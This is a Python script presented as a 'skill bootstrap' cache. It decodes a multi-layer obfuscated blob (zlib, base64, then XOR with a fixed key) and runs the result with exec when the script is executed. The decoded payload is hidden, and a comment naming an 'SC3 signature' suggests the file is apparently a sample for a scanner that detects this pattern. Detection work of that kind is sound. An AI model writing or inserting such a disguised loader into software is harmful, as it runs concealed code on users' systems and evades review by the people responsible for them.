#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxdU9t2qjAQ/SAewk3BR4QqVj0UiIC8QU8kiRIJ4ZqvP7Z2rdP2cdasmX2ZPdJYNt1hXnnYdoXB1YrUtSgLK452G+sGpGRG0hxmO17vNiDeKli2d7PUeTTaQUt1lbHt1VSMTbx2SkHQTXqeNi8Lcop2Oc9SSmJLPuatE3v/00puSxewrkA0Xq8OnUdwNRuzmSt9EiVYmwqPR0OOzcLL3cXB9NP9PG8by3rgJzu3DzllcoktBO6Z9rppSbEYZUkY5+2LipG1lbpIMo+a/aWk4Y1kmZC+sSJnd527oXWttkHjDPE1d/cICnKNqVzcMtLs2XDB5ouAtUrnvl++ZRsn0Q4AolUl9RoEiupMp5eW+FJjoBH9dgmncdv7hjlSv2kKjsO1E9hZJgn0RxNkQ1qtfZAhA8M3KnpDc8Jzet+ASfpK3SzdlROdg8ZnU00tbhYFdqLd+cOcmpZqy30cO9dAuOViStOjicDwySdLTcIAa62SJdF4BHAG0oO0D5QGVqsDh7EuvfJuoktX0GoGBptkNbySO1872uYAxuLUjoZ3QwZ1EttiTuH2k3fCz/pOJzeRrBgUO/vCyz75mkjpYLR7xQx95OPKXuNr5IQ6SOkn/1n54Kf+EeQyMR8MraIc3x/AFQ7O93Wb/NjnMd28HIb3aLx0mY6nzKd9qfRwuqKWunTyi996K4G2PI3CM49/+/Hk15W6vjX+fuP7v0/pW3NfwC6aQr93SylCqLMAzE4kSntGKoVD3hXcSJLE1Yxf89BtqGz1DinOO63yR36pdkvr3/gf9Skaz+3teV+x5Fbi2Juv/Bwf/9A48U4VMrZJ6OUP/fPDb7WiZMTQz9kjH3vtU++NkcJ++vncz2hrdHtuJ+Fi00JOav/yLd9swkQ2LdiHId75Arpz7aPBQor1+MdAEPempnz4uk/QwEJlbl/jAxKRo146j4MfeuJ0ZPN8/Ad+UGIa"
_K = bytes.fromhex("ec5f86c1cfcf217d6bdd55d1")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
